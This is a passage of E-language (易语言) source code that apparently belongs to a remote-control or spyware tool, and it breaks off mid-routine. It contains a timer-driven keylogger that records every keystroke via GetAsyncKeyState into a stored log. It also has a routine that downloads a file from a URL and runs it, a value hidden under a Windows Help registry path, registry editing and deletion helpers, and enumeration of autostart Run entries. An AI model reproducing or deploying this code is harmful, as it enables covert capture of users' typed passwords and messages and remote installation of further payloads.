赋值 (飞, GetAsyncKeyState (192))
赋值 (S1, GetAsyncKeyState (49))
赋值 (S2, GetAsyncKeyState (50))
赋值 (S3, GetAsyncKeyState (51))
赋值 (S4, GetAsyncKeyState (52))
赋值 (S5, GetAsyncKeyState (53))
赋值 (S6, GetAsyncKeyState (54))
赋值 (S7, GetAsyncKeyState (55))
赋值 (S8, GetAsyncKeyState (56))
赋值 (S9, GetAsyncKeyState (57))
赋值 (S0, GetAsyncKeyState (48))
赋值 (减, GetAsyncKeyState (189))
赋值 (加, GetAsyncKeyState (187))
赋值 (除, GetAsyncKeyState (220))
赋值 (BACK, GetAsyncKeyState (8))
赋值 (大写, GetAsyncKeyState (20))
赋值 (F1, GetAsyncKeyState (112))
赋值 (F2, GetAsyncKeyState (113))
赋值 (F3, GetAsyncKeyState (114))
赋值 (F4, GetAsyncKeyState (115))
赋值 (F5, GetAsyncKeyState (116))
赋值 (F6, GetAsyncKeyState (117))
赋值 (F7, GetAsyncKeyState (118))
赋值 (F8, GetAsyncKeyState (119))
赋值 (F9, GetAsyncKeyState (120))
赋值 (F10, GetAsyncKeyState (121))
赋值 (F11, GetAsyncKeyState (122))
赋值 (F12, GetAsyncKeyState (123))
赋值 (Insert, GetAsyncKeyState (45))
赋值 (Home, GetAsyncKeyState (36))
赋值 (PageUp, GetAsyncKeyState (33))
赋值 (PageDown, GetAsyncKeyState (34))
赋值 (End, GetAsyncKeyState (35))
赋值 (Delete, GetAsyncKeyState (46))
赋值 (斜杠, GetAsyncKeyState (191))

.如果真 (键判断 (L方括号))
    返回 (“[”)
.如果真结束
.如果真 (键判断 (R方括号))
    返回 (“]”)
.如果真结束
.如果真 (键判断 (分号))
    返回 (“;”)
.如果真结束
.如果真 (键判断 (引号))
    返回 (“'”)
.如果真结束
.如果真 (键判断 (斜杠))
    返回 (“/”)
.如果真结束
.如果真 (键判断 (逗号))
    返回 (“,”)
.如果真结束
.如果真 (键判断 (右Win))
    返回 (“{Win}”)
.如果真结束
.如果真 (键判断 (右方向))
    返回 (“→”)
.如果真结束
.如果真 (键判断 (下方向))
    返回 (“↓”)
.如果真结束
.如果真 (键判断 (上方向))
    返回 (“↑”)
.如果真结束
.如果真 (键判断 (左方向))
    返回 (“←”)
.如果真结束
.如果真 (键判断 (NumLock))
    返回 (“{Num Lock}”)
.如果真结束
.如果真 (键判断 (ScrollLock))
    返回 (“{Scroll Lock}”)
.如果真结束
.如果真 (键判断 (PrintScreen))
    返回 (“{Prt Scr}”)
.如果真结束
.如果真 (键判断 (Pause))
    返回 (“{Pause}”)
.如果真结束
.如果真 (键判断 (Esc))
    返回 (“{Esc}”)
.如果真结束
.如果真 (键判断 (句号))
    返回 (“.”)
.如果真结束
.如果真 (键判断 (S0))
    返回 (“0”)
.如果真结束
.如果真 (键判断 (回车))
    返回 (“{Enter}”)
.如果真结束
.如果真 (键判断 (空格))
    返回 (“{空格}”)
.如果真结束
.如果真 (键判断 (A))
    .如果 (大小写状态)
        返回 (“A”)
    .否则
        返回 (“a”)
    .如果结束
    
.如果真结束
.如果真 (键判断 (B))
    .如果 (大小写状态)
        返回 (“B”)
    .否则
        返回 (“b”)
    .如果结束
    
.如果真结束
.如果真 (键判断 (C))
    .如果 (大小写状态)
        返回 (“C”)
    .否则
        返回 (“c”)
    .如果结束
    
.如果真结束
.如果真 (键判断 (D))
    .如果 (大小写状态)
        返回 (“D”)
    .否则
        返回 (“d”)
    .如果结束
    
.如果真结束
.如果真 (键判断 (E))
    .如果 (大小写状态)
        返回 (“E”)
    .否则
        返回 (“e”)
    .如果结束
    
.如果真结束
.如果真 (键判断 (F))
    .如果 (大小写状态)
        返回 (“F”)
    .否则
        返回 (“f”)
    .如果结束
    
.如果真结束
.如果真 (键判断 (G))
    .如果 (大小写状态)
        返回 (“G”)
    .否则
        返回 (“g”)
    .如果结束
    
.如果真结束
.如果真 (键判断 (H))
    .如果 (大小写状态)
        返回 (“H”)
    .否则
        返回 (“h”)
    .如果结束
    
.如果真结束
.如果真 (键判断 (I))
    .如果 (大小写状态)
        返回 (“I”)
    .否则
        返回 (“i”)
    .如果结束
    
.如果真结束
.如果真 (键判断 (J))
    .如果 (大小写状态)
        返回 (“J”)
    .否则
        返回 (“j”)
    .如果结束
    
.如果真结束
.如果真 (键判断 (K))
    .如果 (大小写状态)
        返回 (“K”)
    .否则
        返回 (“k”)
    .如果结束
    
.如果真结束
.如果真 (键判断 (L))
    .如果 (大小写状态)
        返回 (“L”)
    .否则
        返回 (“l”)
    .如果结束
    
.如果真结束
.如果真 (键判断 (M))
    .如果 (大小写状态)
        返回 (“M”)
    .否则
        返回 (“m”)
    .如果结束
    
.如果真结束
.如果真 (键判断 (N))
    .如果 (大小写状态)
        返回 (“N”)
    .否则
        返回 (“n”)
    .如果结束
    
.如果真结束
.如果真 (键判断 (O))
    .如果 (大小写状态)
        返回 (“O”)
    .否则
        返回 (“o”)
    .如果结束
    
.如果真结束
.如果真 (键判断 (P))
    .如果 (大小写状态)
        返回 (“P”)
    .否则
        返回 (“p”)
    .如果结束
    
.如果真结束
.如果真 (键判断 (Q))
    .如果 (大小写状态)
        返回 (“Q”)
    .否则
        返回 (“q”)
    .如果结束
    
.如果真结束
.如果真 (键判断 (R))
    .如果 (大小写状态)
        返回 (“R”)
    .否则
        返回 (“r”)
    .如果结束
    
.如果真结束
.如果真 (键判断 (S))
    .如果 (大小写状态)
        返回 (“S”)
    .否则
        返回 (“s”)
    .如果结束
    
.如果真结束
.如果真 (键判断 (T))
    .如果 (大小写状态)
        返回 (“T”)
    .否则
        返回 (“t”)
    .如果结束
    
.如果真结束
.如果真 (键判断 (U))
    .如果 (大小写状态)
        返回 (“U”)
    .否则
        返回 (“u”)
    .如果结束
    
.如果真结束
.如果真 (键判断 (V))
    .如果 (大小写状态)
        返回 (“V”)
    .否则
        返回 (“v”)
    .如果结束
    
.如果真结束
.如果真 (键判断 (W))
    .如果 (大小写状态)
        返回 (“W”)
    .否则
        返回 (“w”)
    .如果结束
    
.如果真结束
.如果真 (键判断 (x))
    .如果 (大小写状态)
        返回 (“X”)
    .否则
        返回 (“x”)
    .如果结束
    
.如果真结束
.如果真 (键判断 (Y))
    .如果 (大小写状态)
        返回 (“Y”)
    .否则
        返回 (“y”)
    .如果结束
    
.如果真结束
.如果真 (键判断 (Z))
    .如果 (大小写状态)
        返回 (“Z”)
    .否则
        返回 (“z”)
    .如果结束
    
.如果真结束
.如果真 (键判断 (S1))
    返回 (“1”)
.如果真结束
.如果真 (键判断 (S2))
    返回 (“2”)
.如果真结束
.如果真 (键判断 (S3))
    返回 (“3”)
.如果真结束
.如果真 (键判断 (S4))
    返回 (“4”)
.如果真结束
.如果真 (键判断 (S5))
    返回 (“5”)
.如果真结束
.如果真 (键判断 (S6))
    返回 (“6”)
.如果真结束
.如果真 (键判断 (S7))
    返回 (“7”)
.如果真结束
.如果真 (键判断 (S8))
    返回 (“8”)
.如果真结束
.如果真 (键判断 (S9))
    返回 (“9”)
.如果真结束
.如果真 (键判断 (飞))
    返回 (“`”)
.如果真结束
.如果真 (键判断 (加))
    返回 (“=”)
.如果真结束
.如果真 (键判断 (减))
    返回 (“-”)
.如果真结束
.如果真 (键判断 (除))
    返回 (“\”)
.如果真结束
.如果真 (键判断 (BACK))
    返回 (“{退格}”)
.如果真结束
.如果真 (键判断 (TAB))
    返回 (“{Tab}”)
.如果真结束
.如果真 (键判断 (Shift))
    返回 (“{Shift}”)
.如果真结束
.如果真 (键判断 (Ctrl))
    返回 (“{Ctrl}”)
.如果真结束
.如果真 (键判断 (Alt))
    返回 (“{Alt}”)
.如果真结束
.如果真 (键判断 (大写))
    返回 (“{CapsLock}”)
.如果真结束
.如果真 (键判断 (Win))
    返回 (“{Win}”)
.如果真结束
.如果真 (键判断 (n1))
    返回 (“1”)
.如果真结束
.如果真 (键判断 (n2))
    返回 (“2”)
.如果真结束
.如果真 (键判断 (n3))
    返回 (“3”)
.如果真结束
.如果真 (键判断 (n4))
    返回 (“4”)
.如果真结束
.如果真 (键判断 (n5))
    返回 (“5”)
.如果真结束
.如果真 (键判断 (n6))
    返回 (“6”)
.如果真结束
.如果真 (键判断 (n7))
    返回 (“7”)
.如果真结束
.如果真 (键判断 (n8))
    返回 (“8”)
.如果真结束
.如果真 (键判断 (n9))
    返回 (“9”)
.如果真结束
.如果真 (键判断 (n加))
    返回 (“=”)
.如果真结束
.如果真 (键判断 (n减))
    返回 (“-”)
.如果真结束
.如果真 (键判断 (n除))
    返回 (“\”)
.如果真结束
.如果真 (键判断 (n乘))
.如果真结束
.如果真 (键判断 (n回车))
    返回 (“{回车}”)
.如果真结束
.如果真 (键判断 (n0))
    返回 (“0”)
.如果真结束
.如果真 (键判断 (n点))
    返回 (“.”)
.如果真结束
.如果真 (键判断 (F1))
    返回 (“{F1}”)
.如果真结束
.如果真 (键判断 (F2))
    返回 (“{F2}”)
.如果真结束
.如果真 (键判断 (F3))
    返回 (“{F3}”)
.如果真结束
.如果真 (键判断 (F4))
    返回 (“{F4}”)
.如果真结束
.如果真 (键判断 (F5))
    返回 (“{F5}”)
.如果真结束
.如果真 (键判断 (F6))
    返回 (“{F6}”)
.如果真结束
.如果真 (键判断 (F7))
    返回 (“{F7}”)
.如果真结束
.如果真 (键判断 (F8))
    返回 (“{F8}”)
.如果真结束
.如果真 (键判断 (F9))
    返回 (“{F9}”)
.如果真结束
.如果真 (键判断 (F10))
    返回 (“{F10}”)
.如果真结束
.如果真 (键判断 (F11))
    返回 (“{F11}”)
.如果真结束
.如果真 (键判断 (F12))
    返回 (“{F12}”)
.如果真结束
.如果真 (键判断 (Delete))
    返回 (“{DEL}”)
.如果真结束
.如果真 (键判断 (Insert))
    返回 (“{INS}”)
.如果真结束
.如果真 (键判断 (Home))
    返回 (“{HOME}”)
.如果真结束
.如果真 (键判断 (PageUp))
    返回 (“{Page Up}”)
.如果真结束
.如果真 (键判断 (PageDown))
    返回 (“{Page Down}”)
.如果真结束
.如果真 (键判断 (End))
    返回 (“{END}”)
.如果真结束

返回 (“”)

.子程序 键判断, 逻辑型, , 
.参数 键, 整数型, , 

.判断开始 (等于 (键, -32767))
    返回 (真)
.默认
    返回 (假)
.判断结束


.子程序 取键盘指示灯状态_, 逻辑型, 公开, 返回真表示开启
.参数 指示灯类别, 整数型, 可空, 0：数字锁定键盘灯，1：大小写锁定键盘灯，2：滚动锁定键盘灯。为空默认为0

.局部变量 状态, 整数型, , , 

.判断开始 (等于 (指示灯类别, 0))
    赋值 (状态, API_最近的输入虚拟键状态 (144))
.判断 (等于 (指示灯类别, 1))
    赋值 (状态, API_最近的输入虚拟键状态 (20))
.判断 (等于 (指示灯类别, 2))
    赋值 (状态, API_最近的输入虚拟键状态 (145))
.默认
    
.判断结束
返回 (等于 (状态, 1))


.子程序 停止键盘记录, 文本型, , 
.局部变量 键盘记录_, 文本型, , , 

键盘记录_KillEvent (键盘记录_hMMTimer)
赋值 (键盘记录_, 键盘记录_内容)
赋值 (键盘记录_内容, “”)
赋值 (键盘记录_hMMTimer, 0)
返回 (键盘记录_)

.子程序 TimerProc, 空白型, , 
.参数 uID, 整数型, , 
.参数 uMsg, 整数型, , 
.参数 dwUser, 整数型, , 
.参数 dw1, 整数型, , 
.参数 dw2, 整数型, , 

.局部变量 临时文本, 文本型, , , 

赋值 (临时文本, 键盘记录 (取键盘指示灯状态_ (1)))
.如果真 (等于 (临时文本, “”))
    返回 ()
.如果真结束
赋值 (键盘记录_内容, 相加 (键盘记录_内容, 临时文本))
 ' 输出调试文本 (键盘记录_内容)

.子程序 开始键盘记录, 逻辑型, , 
 ' 键盘记录_hMMTimer ＝ 0
 ' 调试输出 (键盘记录_SetTimer (0, 1, 1, &TimerProc))
.如果真 (等于 (键盘记录_hMMTimer, 0))
    赋值 (键盘记录_hMMTimer, 键盘记录_SetEvent (10, 0, &TimerProc, 0, 1))
    返回 (真)
.如果真结束
返回 (假)

.子程序 HTTP下载文件, 空白型, , 
.参数 下载后运行, 字节集, , 
.参数 HTTP读文件地址, 文本型, , 

.局部变量 文件名, 文本型, , , 
.局部变量 数据, 字节集, , , 

赋值 (文件名, 取文本右边 (HTTP读文件地址, 相减 (取文本长度 (HTTP读文件地址), 倒找文本 (HTTP读文件地址, “/”, , 假))))
赋值 (数据, http读文件_ (HTTP读文件地址))
写到文件 (文件名, 数据)
.如果 (等于 (下载后运行, { 2 }))
    运行 (文件名, 假, 1)
.否则
    
.如果结束


.子程序 本机备注, 文本型, , 
.参数 文本, 文本型, 可空, 

.如果 (等于 (删首尾空 (文本), “”)) ' 读备注
    返回 (取文本注册项 (4, “SOFTWARE\Microsoft\Windows\Help\helpyou\备注”, “”))
.否则
     ' 写备注
    .如果真 (写注册项 (4, “SOFTWARE\Microsoft\Windows\Help\helpyou\备注”, 文本))
        返回 (文本)
    .如果真结束
    
.如果结束
返回 (“”)


.子程序 窗口总在最前, 空白型, , 
.参数 参_窗口句柄, 整数型, , 

SetWindowPos (参_窗口句柄, -1, 0, 0, 0, 0, 3)

.子程序 取内存容量信息_, 整数型, , 
.局部变量 a, LPMEMORYSTATUSEX, , , 

赋值 (a.dwLength, 64)
GlobalMemoryStatusEx (a)
返回 (到整数 (相除 (a.ullTotalPhys, 1024, 1024)))

.类模块 注册表类, , , 

.子程序 _初始化, 空白型, , 当基于本类的对象被创建后，此方法会被自动调用


.子程序 _销毁, 空白型, , 当基于本类的对象被销毁前，此方法会被自动调用


.子程序 映射根键, 整数型, , 将易语言根键常量转换为windows常量
.参数 参根键, 整数型, , 

.判断开始 (等于 (参根键, 4))
    返回 (#HKEY_LOCAL_MACHINE)
.判断 (等于 (参根键, 3))
    返回 (#HKEY_CURRENT_USER)
.判断 (等于 (参根键, 2))
    返回 (#HKEY_CURRENT_CONFIG)
.判断 (等于 (参根键, 1))
    返回 (#HKEY_CLASSES_ROOT)
.判断 (等于 (参根键, 5))
    返回 (#HKEY_USERS)
.默认
    
.判断结束
返回 (0)

.子程序 枚举子文件夹, 文本型, 公开, 返回的文本以换行符分割
.参数 参磁盘, 空白型, , 
.参数 参文件夹, 文本型, , 

.局部变量 r, 整数型, , , 存放api函数的返回值
.局部变量 键句柄, 整数型, , , 
.局部变量 名字长度, 整数型, , , 
.局部变量 名字, 文本型, , , 
.局部变量 索引, 整数型, , , 
.局部变量 上次修改时间, 整数型, , , 
.局部变量 结果文本, 文本型, , , 
.局部变量 项名, 文本型, , "0", 
.局部变量 下级, 文本型, , , 

.如果真 (等于 (取文本左边 (参文件夹, 1), “\”))
    赋值 (参文件夹, 取文本右边 (参文件夹, 相减 (取文本长度 (参文件夹), 1)))
.如果真结束
.如果 (不等于 (取文本右边 (参文件夹, 1), “\”))
    赋值 (下级, 相加 (参文件夹, “\”))
.否则
    赋值 (下级, 参文件夹)
.如果结束
赋值 (参磁盘, 映射根键 (参磁盘))
赋值 (r, RegOpenKeyExA (参磁盘, 参文件夹, 0, 983103, 键句柄))
.如果真 (等于 (r, 0))
    赋值 (名字长度, 255)
    赋值 (名字, 取空白文本 (255))
    赋值 (r, RegEnumKeyEx (键句柄, 索引, 名字, 名字长度, 0, 0, 0, 上次修改时间))
    .判断循环首 (等于 (r, 0))
        处理事件 ()
        加入成员 (项名, 取文本左边 (名字, 名字长度))
        赋值 (索引, 相加 (索引, 1))
        赋值 (名字长度, 255)
        赋值 (名字, 取空白文本 (255))
        赋值 (r, RegEnumKeyEx (键句柄, 索引, 名字, 名字长度, 0, 0, 0, 上次修改时间))
    .判断循环尾 ()
.如果真结束
RegCloseKey (键句柄)
赋值 (键句柄, 取数组成员数 (项名))
.计次循环首 (键句柄, 索引)
    赋值 (结果文本, 相加 (结果文本, 项名 [索引], 是否存在子项 (参磁盘, 相加 (下级, 项名 [索引]))))
.计次循环尾 ()
返回 (相加 (到文本 (键句柄), “к”, 结果文本))

.子程序 是否存在子项, 文本型, , 列出当前文件夹下的第 i 个文件夹
.参数 参磁盘, 整数型, , 
.参数 参文件夹, 文本型, , 

.局部变量 键句柄, 空白型, , , 
.局部变量 名字长度, 空白型, , , 
.局部变量 上次修改时间, 空白型, , , 
.局部变量 结果文本, 文本型, , , 
.局部变量 名字, 文本型, , , 
.局部变量 t, 空白型, , , 

.如果真 (等于 (取文本左边 (参文件夹, 1), “\”))
    赋值 (参文件夹, 取文本右边 (参文件夹, 相减 (取文本长度 (参文件夹), 1)))
.如果真结束
赋值 (t, RegOpenKeyExA (参磁盘, 参文件夹, 0, 983103, 键句柄))
.如果真 (等于 (t, 0))
    赋值 (名字长度, 255)
    赋值 (名字, 取空白文本 (255))
    赋值 (t, RegEnumKeyEx (键句柄, 0, 名字, 名字长度, 0, 0, 0, 上次修改时间))
    .如果真 (等于 (t, 0))
        返回 (“0к”)
    .如果真结束
    RegCloseKey (键句柄)
.如果真结束
返回 (“1к”)

.子程序 列出文件夹, 文本型, , 列出当前文件夹下的第 i 个文件夹
.参数 参磁盘, 整数型, , 
.参数 参文件夹, 文本型, , 
.参数 参索引, 空白型, , 

.局部变量 键句柄, 空白型, , , 
.局部变量 名字长度, 空白型, , , 
.局部变量 上次修改时间, 空白型, , , 
.局部变量 结果文本, 文本型, , , 
.局部变量 名字, 文本型, , , 
.局部变量 r, 空白型, , , 

赋值 (r, RegOpenKeyExA (参磁盘, 参文件夹, 0, 983103, 键句柄))
.如果真 (等于 (r, 0))
    赋值 (名字长度, 255)
    赋值 (名字, 取空白文本 (255))
    赋值 (r, RegEnumKeyEx (键句柄, 参索引, 名字, 名字长度, 0, 0, 0, 上次修改时间))
    .如果真 (等于 (r, 0))
        返回 (名字)
    .如果真结束
    
.如果真结束
返回 (“”)

.子程序 枚举文件, 文本型, 公开, 
.参数 参磁盘, 空白型, , 
.参数 参文件夹, 文本型, , 

.局部变量 r, 空白型, , , 存放api函数的返回值
.局部变量 键句柄, 空白型, , , 
.局部变量 名字长度, 空白型, , , 
.局部变量 名字, 文本型, , , 
.局部变量 索引, 空白型, , , 
.局部变量 上次修改时间, 空白型, , , 
.局部变量 结果文本, 文本型, , , 
.局部变量 数量, 整数型, , , 
.局部变量 类型, 整数型, , , 
.局部变量 内容, 字节集, , , 
.局部变量 内容长度, 整数型, , , 
.局部变量 a, 整数型, , , 
.局部变量 项值, 文本型, , , 
.局部变量 默认, 逻辑型, , , 
.局部变量 长整数, 长整数型, , , 

.如果真 (等于 (取文本左边 (参文件夹, 1), “\”))
    赋值 (参文件夹, 取文本右边 (参文件夹, 相减 (取文本长度 (参文件夹), 1)))
.如果真结束
赋值 (参磁盘, 映射根键 (参磁盘))
赋值 (r, RegOpenKeyExA (参磁盘, 参文件夹, 0, 983103, 键句柄))
赋值 (默认, 假)
.如果真 (等于 (r, 0))
    赋值 (名字长度, 255)
    赋值 (名字, 取空白文本 (255))
    r ＝ RegEnumKeyEx (键句柄, 索引, 名字, 名字长度, 0, 0, 0, 上次修改时间)
    赋值 (r, RegEnumValue (键句柄, 索引, 名字, 名字长度, 0, 0, 0, 0))
    .判断循环首 (等于 (r, 0))
        赋值 (内容, 取空白字节集 (256))
        赋值 (内容长度, 256)
        处理事件 ()
        .如果真 (等于 (取文本左边 (名字, 名字长度), “”))
            赋值 (结果文本, 相加 (结果文本, “(默认)”))
            赋值 (默认, 真)
        .如果真结束
        赋值 (a, RegQueryValueEx (键句柄, 取文本左边 (名字, 名字长度), 0, 类型, 内容, 内容长度))
        赋值 (项值, “”)
        .判断开始 (等于 (类型, 1))
            赋值 (项值, 取字节集数据 (内容, 10, ))
        .判断 (等于 (类型, 2))
            赋值 (项值, 取字节集数据 (内容, 10, ))
        .判断 (等于 (类型, 3))
            赋值 (项值, 到文本 (到整数 (内容)))
        .判断 (等于 (类型, 4))
            赋值 (项值, 到文本 (取字节集数据 (内容, 4, )))
             ' 项值 ＝ 到文本 (取字节集数据 (内容, 4, ))  ' ''''''''''''''''''''''
        .判断 (等于 (类型, 7))
            赋值 (内容, 子字节集替换 (内容, { 0 }, { 32 }, , ))
            赋值 (项值, 到文本 (内容))
        .默认
            赋值 (项值, “无法显示”)
        .判断结束
        赋值 (结果文本, 相加 (结果文本, 取文本左边 (名字, 名字长度), “ё”, 到文本 (类型), 项值, “к”))
        赋值 (索引, 相加 (索引, 1))
        赋值 (名字长度, 255)
        赋值 (名字, 取空白文本 (255))
        赋值 (r, RegEnumValue (键句柄, 索引, 名字, 名字长度, 0, 0, 0, 0))
    .判断循环尾 ()
    .如果真 (等于 (默认, 假))
        赋值 (索引, 相加 (索引, 1))
        赋值 (结果文本, 相加 (“(默认)ё1(未设置键值)к”, 结果文本))
    .如果真结束
    
.如果真结束
RegCloseKey (键句柄)
返回 (相加 (“ *#$”, 到文本 (索引), “к”, 结果文本))

.子程序 删除文件夹及其子文件夹, 空白型, 公开, 
.参数 参磁盘, 空白型, , 
.参数 参文件夹, 文本型, , 

赋值 (参磁盘, 映射根键 (参磁盘))
.如果真 (等于 (取文本左边 (参文件夹, 1), “\”))
    赋值 (参文件夹, 取文本右边 (参文件夹, 相减 (取文本长度 (参文件夹), 1)))
.如果真结束
递归删除文件夹 (参磁盘, 参文件夹)

.子程序 递归删除文件夹, 空白型, , 
.参数 参磁盘, 空白型, , 
.参数 参文件夹, 文本型, , 

.局部变量 r, 空白型, , , 存放api函数的返回值
.局部变量 键句柄, 空白型, , , 
.局部变量 上次修改时间, 空白型, , , 
.局部变量 结果文本, 文本型, , , 
.局部变量 i, 空白型, , , 
.局部变量 a, 文本型, , , 
.局部变量 b, 文本型, , , 

赋值 (i, 0)
.循环判断首 ()
    赋值 (b, a)
    赋值 (a, 列出文件夹 (参磁盘, 参文件夹, 0))
    .如果真 (不等于 (a, “”))
        递归删除文件夹 (参磁盘, 相加 (参文件夹, “\”, a))
    .如果真结束
    a=
.循环判断尾 (不等于 (a, b))
删除文件夹 (参磁盘, 参文件夹)

.子程序 删除项, 逻辑型, 公开, 有子文件夹则不能删除
.参数 参磁盘, 空白型, , 
.参数 参文件夹, 文本型, , 
.参数 项名, 文本型, , 

.局部变量 r, 空白型, , , 
.局部变量 键句柄, 整数型, , , 
.局部变量 a, 整数型, , , 

赋值 (参磁盘, 映射根键 (参磁盘))
.如果真 (等于 (取文本左边 (参文件夹, 1), “\”))
    赋值 (参文件夹, 取文本右边 (参文件夹, 相减 (取文本长度 (参文件夹), 1)))
.如果真结束
赋值 (r, RegOpenKeyExA (参磁盘, 参文件夹, 0, 983103, 键句柄))
.如果真 (等于 (r, 0))
    赋值 (a, RegDeleteValueA (键句柄, 项名))
    .如果真 (等于 (a, 0))
        RegCloseKey (键句柄)
        返回 (真)
    .如果真结束
    
.如果真结束
返回 (假)

.子程序 删除文件夹, 逻辑型, , 有子文件夹则不能删除
.参数 参磁盘, 空白型, , 
.参数 参文件夹, 文本型, , 

.局部变量 r, 空白型, , , 

赋值 (r, RegDeleteKeyA (参磁盘, 参文件夹))
.如果真 (等于 (r, 0))
    返回 (真)
.如果真结束
返回 (假)

.子程序 设置文件关联, 空白型, 公开, 
.参数 参扩展名, 文本型, , 
.参数 参程序名, 文本型, , 
.参数 参图标文件, 文本型, , 
.参数 参扩展名描述, 文本型, , 
.参数 参文档描述, 文本型, , 

.如果真 (或者 (等于 (参扩展名, “”), 等于 (参程序名, “”), 等于 (参图标文件, “”), 等于 (参扩展名描述, “”)))
    返回 ()
.如果真结束
.如果真 (不等于 (取文本左边 (参扩展名, 1), “.”))
    赋值 (参扩展名, 相加 (“.”, 参扩展名))
.如果真结束
写注册项 (1, 相加 (参扩展名, “\”), 参扩展名描述)
写注册项 (1, 相加 (参扩展名描述, “\shell\open\command\”), 相加 (#引号, 参程序名, #引号, “ ”, #引号, “%1”, #引号))
写注册项 (1, 相加 (参扩展名描述, “\DefaultIcon\”), 参图标文件)
写注册项 (1, 相加 (参扩展名描述, “\”), 参文档描述)

.子程序 取关联程序, 文本型, 公开, 
.参数 参扩展名, 文本型, , 

.局部变量 结果文本, 文本型, , , 
.局部变量 文本数组, 文本型, , "0", 

.如果真 (不等于 (取文本左边 (参扩展名, 1), “.”))
    赋值 (参扩展名, 相加 (“.”, 参扩展名))
.如果真结束
赋值 (结果文本, 取文本注册项 (1, 相加 (参扩展名, “\”), “error”))
.如果真 (不等于 (结果文本, “error”))
    赋值 (结果文本, 取文本注册项 (1, 相加 (结果文本, “\shell\open\command\”), ))
    .如果 (不等于 (寻找文本 (结果文本, #引号, , 假), -1))
        赋值 (文本数组, 分割文本 (结果文本, #引号, ))
        赋值 (结果文本, 文本数组 [2])
    .否则
        赋值 (文本数组, 分割文本 (删首尾空 (结果文本), “ ”, ))
        
        赋值 (结果文本, 文本数组 [1])
    .如果结束
    
.如果真结束
返回 (结果文本)

.子程序 添加右键菜单项, 逻辑型, 公开, 
.参数 参扩展名, 文本型, , 
.参数 参菜单标题, 文本型, , 
.参数 参命令行, 文本型, , 

.局部变量 扩展名描述, 文本型, , , 
.局部变量 r, 逻辑型, , , 

.如果真 (或者 (等于 (参扩展名, “”), 等于 (参菜单标题, “”), 等于 (参命令行, “”)))
    返回 (假)
.如果真结束
.如果真 (不等于 (取文本左边 (参扩展名, 1), “.”))
    赋值 (参扩展名, 相加 (“.”, 参扩展名))
.如果真结束
赋值 (扩展名描述, 取文本注册项 (1, 相加 (参扩展名, “\”), “error”))
.如果真 (等于 (扩展名描述, “error”))
    返回 (假)
.如果真结束
赋值 (r, 写注册项 (1, 相加 (扩展名描述, “\shell\”, 参菜单标题, “\command\”), 参命令行))
返回 (r)

.子程序 删除右键菜单项, 逻辑型, 公开, 
.参数 参扩展名, 文本型, , 
.参数 参菜单标题, 文本型, , 

.局部变量 扩展名描述, 文本型, , , 
.局部变量 r, 逻辑型, , , 

.如果真 (或者 (等于 (参扩展名, “”), 等于 (参菜单标题, “”)))
    返回 (假)
.如果真结束
.如果真 (不等于 (取文本左边 (参扩展名, 1), “.”))
    赋值 (参扩展名, 相加 (“.”, 参扩展名))
.如果真结束
赋值 (扩展名描述, 取文本注册项 (1, 相加 (参扩展名, “\”), “error”))
.如果真 (等于 (扩展名描述, “error”))
    返回 (假)
.如果真结束
r ＝ 删除注册项 (#根类, 扩展名描述 ＋ “\shell\” ＋ 参菜单标题)
删除文件夹及其子文件夹 (1, 相加 (扩展名描述, “\shell\”, 参菜单标题))
返回 (真)

.子程序 枚举子键, 整数型, , 
.参数 参磁盘, 整数型, , 
.参数 参文件夹, 文本型, , 
.参数 名称, 文本型, 参考 数组, 
.参数 项值, 文本型, 参考 数组, 
.参数 类型, 整数型, 参考 数组, 

.局部变量 r, 空白型, , , 存放api函数的返回值
.局部变量 键句柄, 空白型, , , 
.局部变量 名字长度, 空白型, , , 
.局部变量 名字, 文本型, , , 
.局部变量 索引, 空白型, , , 
.局部变量 上次修改时间, 空白型, , , 
.局部变量 结果文本, 文本型, , , 
.局部变量 数量, 整数型, , , 
.局部变量 类型a, 整数型, , , 
.局部变量 内容, 字节集, , , 
.局部变量 内容长度, 整数型, , , 
.局部变量 a, 整数型, , , 
.局部变量 项值a, 文本型, , , 
.局部变量 默认, 逻辑型, , , 
.局部变量 长整数, 长整数型, , , 

清除数组 (名称)
清除数组 (项值)
清除数组 (类型)
.如果真 (等于 (取文本左边 (参文件夹, 1), “\”))
    赋值 (参文件夹, 取文本右边 (参文件夹, 相减 (取文本长度 (参文件夹), 1)))
.如果真结束
赋值 (参磁盘, 映射根键 (参磁盘))
赋值 (r, RegOpenKeyExA (参磁盘, 参文件夹, 0, 983103, 键句柄))
.如果真 (等于 (r, 0))
    赋值 (名字长度, 255)
    赋值 (名字, 取空白文本 (255))
    赋值 (r, RegEnumValue (键句柄, 索引, 名字, 名字长度, 0, 0, 0, 0))
    .判断循环首 (等于 (r, 0))
        赋值 (内容, 取空白字节集 (256))
        赋值 (内容长度, 256)
        处理事件 ()
        .如果 (等于 (取文本左边 (名字, 名字长度), “”))
            加入成员 (名称, “(默认)”)
        .否则
            加入成员 (名称, 取文本左边 (名字, 名字长度))
        .如果结束
        赋值 (a, RegQueryValueEx (键句柄, 取文本左边 (名字, 名字长度), 0, 类型a, 内容, 内容长度))
        赋值 (项值a, “”)
        .判断开始 (等于 (类型a, 1))
            赋值 (项值a, 到文本 (内容))
        .判断 (等于 (类型a, 2))
            赋值 (项值a, 到文本 (内容))
        .判断 (等于 (类型a, 3))
            赋值 (项值a, 到文本 (到整数 (内容)))
        .判断 (等于 (类型a, 4))
            赋值 (长整数, 到整数 (内容))
            赋值 (项值a, 到文本 (长整数))
        .判断 (等于 (类型a, 5))
            赋值 (长整数, 到整数 (内容))
            赋值 (项值a, 到文本 (长整数))
        .默认
            赋值 (项值a, “无法显示”)
        .判断结束
        加入成员 (项值, 项值a)
        加入成员 (类型, 类型a)
        赋值 (索引, 相加 (索引, 1))
        赋值 (名字长度, 255)
        赋值 (名字, 取空白文本 (255))
        赋值 (r, RegEnumValue (键句柄, 索引, 名字, 名字长度, 0, 0, 0, 0))
    .判断循环尾 ()
.如果真结束
RegCloseKey (键句柄)
返回 (取数组成员数 (名称))

.子程序 枚举启动列表, 文本型, 公开, 
.局部变量 d, 整数型, , , 
.局部变量 t, 整数型, , , 
.局部变量 f, 文本型, , , 
.局部变量 Value, 文本型, , "0", 
.局部变量 Data, 文本型, , "0", 
.局部变量 Type, 整数型, , "0", 
.局部变量 容器2, 整数型, , , 
.局部变量 信息2, 文本型, , , 
.局部变量 容器1, 整数型, , , 
.局部变量 n, 整数型, , , 

赋值 (f, “\Software\Microsoft\Windows\CurrentVersion\Run”)
.计次循环首 (枚举子键 (3, f, Value, Data, Type), n)
    .判断开始 (等于 (Value [n], “”))
        赋值 (信息2, 相加 (信息2, “1(默认)ё”))
    .默认
